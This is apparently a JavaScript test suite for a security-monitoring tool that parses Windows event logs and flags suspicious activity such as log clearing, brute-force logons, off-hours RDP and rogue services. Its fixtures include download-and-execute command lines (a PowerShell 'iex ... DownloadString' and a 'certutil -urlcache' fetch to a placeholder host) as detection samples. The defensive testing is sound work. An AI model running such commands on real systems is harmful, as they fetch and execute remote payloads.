import test from 'node:test'
import assert from 'node:assert/strict'
import { readFileSync } from 'node:fs'
import { fileURLToPath } from 'node:url'
import { DEFAULT_COMMAND_KEYWORDS } from '../config/detectionRules.js'
import { CURATED_EVENTS, EVENTLOG_COLLECTION_SCRIPT, getEventDefinition } from '../config/eventLogs.js'
import { buildEventLogEvents, coverage, logonSessions, parseEventLogJson, silentPeriods } from './eventLogs.js'
import { createSocEngine } from './soc.js'

const engine = createSocEngine({
  keywords: [],
  commandKeywords: DEFAULT_COMMAND_KEYWORDS,
  businessHours: { startHour: 8, endHour: 18, flagWeekends: false },
})

// Local wall-clock times (business hours are judged in the analyst's zone).
const at = (hour, minute = 0, second = 0) => new Date(2026, 2, 3, hour, minute, second).getTime()
const ev = (recordId, eventId, time, data = {}, channel = 'Security') => ({
  id: `evt:${channel}:${recordId}`,
  time,
  eventId,
  channel,
  computer: 'WKS-042',
  recordId,
  data,
})
const rules = (event) => event.soc.keywordMatches.map((rule) => rule.id)
const build = (events) =>
  buildEventLogEvents({
    channels: events.reduce((acc, e) => {
      ;(acc[e.channel] ??= { events: [], meta: {} }).events.push(e)
      return acc
    }, {}),
    engine,
  })

test('the curated set matches the server (backend/app/parsing/eventlog.py)', () => {
  const source = readFileSync(fileURLToPath(new URL('../../backend/app/parsing/eventlog.py', import.meta.url)), 'utf8')
  const block = source.slice(source.indexOf('CURATED:'), source.indexOf('# Canonical spelling'))
  const server = {}
  for (const match of block.matchAll(/"([^"]+)": frozenset\(\s*\{([^}]*)\}/g)) {
    server[match[1]] = [...match[2].matchAll(/\b\d+\b/g)].map((m) => Number(m[0])).sort((a, b) => a - b)
  }
  const client = Object.fromEntries(
    Object.entries(CURATED_EVENTS).map(([key, ids]) => [key, [...ids].sort((a, b) => a - b)]),
  )
  assert.deepEqual(server, client)
})

test('the collection script lists every curated channel', () => {
  for (const key of Object.keys(CURATED_EVENTS)) {
    assert.match(EVENTLOG_COLLECTION_SCRIPT.code.toLowerCase(), new RegExp(`'${key.replace(/[/\\]/g, '\\$&')}'`))
  }
})

test('parseEventLogJson keeps curated ids, canonical channels and coverage from the script', () => {
  const json = JSON.stringify({
    format: 'nik-eventlogs',
    host: 'WKS-042',
    logs: [{ name: 'Security', total: 5120, first: '2026-03-01T00:00:00Z', last: '2026-03-03T12:00:00Z' }],
    events: [
      {
        TimeCreated: '2026-03-03T10:00:00Z',
        Id: 4624,
        LogName: 'Security',
        RecordId: 11,
        Data: { TargetUserName: 'm.rossi', LogonType: 10, IpAddress: '-', LogonGuid: '%%1793' },
      },
      { TimeCreated: '/Date(1772532000000)/', Id: 4907, LogName: 'security', RecordId: 12, Data: {} },
      {
        TimeCreated: '2026-03-03T09:00:00Z',
        Id: 800,
        LogName: 'windows powershell',
        RecordId: 3,
        Properties: [{ Value: 'IEX (New-Object Net.WebClient)' }],
      },
      { TimeCreated: '2026-03-03T09:00:00Z', Id: 1, LogName: 'Application', RecordId: 1 },
    ],
  })
  const channels = parseEventLogJson(json, 'host.json')
  assert.deepEqual(Object.keys(channels).sort(), ['Security', 'Windows PowerShell'])
  const security = channels.Security
  assert.deepEqual(security.events[0].data, { TargetUserName: 'm.rossi', LogonType: '10' })
  assert.equal(security.events[0].computer, 'WKS-042')
  assert.equal(security.meta.total, 5120)
  assert.equal(security.meta.first, Date.parse('2026-03-01T00:00:00Z'))
  assert.equal(security.meta.kept, 1)
  assert.equal(channels['Windows PowerShell'].events[0].data.Data1, 'IEX (New-Object Net.WebClient)')

  assert.throws(() => parseEventLogJson('not json'), /Not a JSON file/)
  assert.throws(() => parseEventLogJson('{"hello": 1}'), /No events/)
})

test('single-event rules', () => {
  const events = build([
    ev(1, 1102, at(10), { SubjectUserName: 'admin' }),
    ev(2, 7045, at(10), { ServiceName: 'upd', ImagePath: 'C:\\Users\\Public\\upd.exe' }, 'System'),
    ev(3, 7045, at(10), { ServiceName: 'drv', ImagePath: 'C:\\ProgramData\\Microsoft\\Defender\\x.sys' }, 'System'),
    ev(
      4,
      4104,
      at(10),
      { ScriptBlockText: 'iex (New-Object Net.WebClient).DownloadString("http://x")' },
      'Microsoft-Windows-PowerShell/Operational',
    ),
    ev(5, 4624, at(23), {
      TargetUserName: 'm.rossi',
      LogonType: '10',
      IpAddress: '185.220.101.47',
      TargetLogonId: '0x1',
    }),
    ev(6, 4732, at(10), { MemberName: 'CN=evil', TargetUserName: 'Administrators' }),
    ev(7, 4688, at(10), { CommandLine: 'certutil -urlcache -f http://x/a.exe a.exe & certutil -decode a b' }),
    ev(8, 4624, at(23), { TargetUserName: 'SYSTEM', LogonType: '5', TargetLogonId: '0x3e7' }),
  ])
  const byRecord = Object.fromEntries(events.map((e) => [e.recordId, e]))
  assert.deepEqual(rules(byRecord[1]), ['evt-log-cleared'])
  assert.deepEqual(rules(byRecord[2]), ['evt-service-user-path'])
  assert.deepEqual(rules(byRecord[3]), ['evt-service-installed'])
  assert.ok(rules(byRecord[4]).includes('evt-ps-suspicious'))
  assert.ok(rules(byRecord[4]).includes('cmd-download-exec')) // command ruleset on the script block
  assert.deepEqual(rules(byRecord[5]), ['evt-rdp-off-hours'])
  assert.equal(byRecord[5].soc.severity, 'high')
  assert.deepEqual(rules(byRecord[6]), ['evt-admin-group'])
  assert.ok(rules(byRecord[7]).includes('cmd-encoded'))
  // A night-time service logon is machine activity: not judged by the clock.
  assert.equal(byRecord[8].soc.severity, null)
  assert.equal(byRecord[5].label, 'Logon')
  assert.match(byRecord[5].summary, /m\.rossi — RDP from 185\.220\.101\.47/)
})

test('brute force and a logon right after the failures', () => {
  const failures = Array.from({ length: 12 }, (_, i) =>
    ev(100 + i, 4625, at(11, 0, i * 20), { TargetUserName: 'admin', IpAddress: '10.0.0.66', LogonType: '3' }),
  )
  const slow = [0, 1].map((i) => ev(200 + i, 4625, at(9 + i * 2), { TargetUserName: 'bob', IpAddress: '10.0.0.7' }))
  const success = ev(300, 4624, at(11, 10), { TargetUserName: 'admin', IpAddress: '10.0.0.66', LogonType: '3' })
  const events = build([...failures, ...slow, success])
  const byRecord = Object.fromEntries(events.map((e) => [e.recordId, e]))
  assert.ok(failures.every((f) => rules(byRecord[f.recordId]).includes('evt-bruteforce')))
  assert.ok(slow.every((f) => !rules(byRecord[f.recordId]).includes('evt-bruteforce')))
  assert.deepEqual(rules(byRecord[300]), ['evt-logon-after-failures'])
})

test('logon sessions pair logon, logoff and admin privileges', () => {
  const events = build([
    ev(1, 4624, at(9), { TargetUserName: 'm.rossi', TargetDomainName: 'CORP', LogonType: '2', TargetLogonId: '0xA' }),
    ev(2, 4672, at(9), { SubjectUserName: 'm.rossi', SubjectLogonId: '0xA' }),
    ev(3, 4634, at(11), { TargetUserName: 'm.rossi', TargetLogonId: '0xA' }),
    ev(4, 4624, at(12), { TargetUserName: 'guest', LogonType: '3', TargetLogonId: '0xB', IpAddress: '10.0.0.9' }),
    ev(5, 4624, at(12), { TargetUserName: 'WKS-042$', LogonType: '3', TargetLogonId: '0xC' }),
  ])
  const sessions = logonSessions(events)
  assert.deepEqual(
    sessions.map((s) => [s.user, s.logonType, s.elevated, s.durationMs, s.source]),
    [
      ['guest', '3', false, null, '10.0.0.9'],
      ['CORP\\m.rossi', '2', true, 2 * 3600 * 1000, ''],
    ],
  )
})

test('coverage rows, silences and clears', () => {
  assert.deepEqual(silentPeriods([0, 1, 7 * 3600 * 1000]), [[1, 7 * 3600 * 1000]])
  const channels = {
    Security: { events: [], meta: { first: 100, last: 900, total: 50, gaps: [[200, 400]] } },
    System: { events: [ev(9, 104, 950, { Channel: 'Security' }, 'System')], meta: { first: 50, last: 990, total: 5 } },
  }
  const events = buildEventLogEvents({ channels, engine })
  const result = coverage(channels, events)
  assert.equal(result.min, 50)
  assert.equal(result.max, 990)
  const security = result.rows.find((row) => row.name === 'Security')
  assert.deepEqual(security.cleared, [950]) // 104 names the log it cleared
  assert.deepEqual(security.gaps, [[200, 400]])
})

test('every curated id has a label and a summary', () => {
  for (const [channel, ids] of Object.entries(CURATED_EVENTS)) {
    for (const id of ids) {
      const definition = getEventDefinition(channel, id)
      assert.ok(definition?.label, `${channel} ${id}`)
      assert.equal(typeof definition.summary({}), 'string')
    }
  }
})
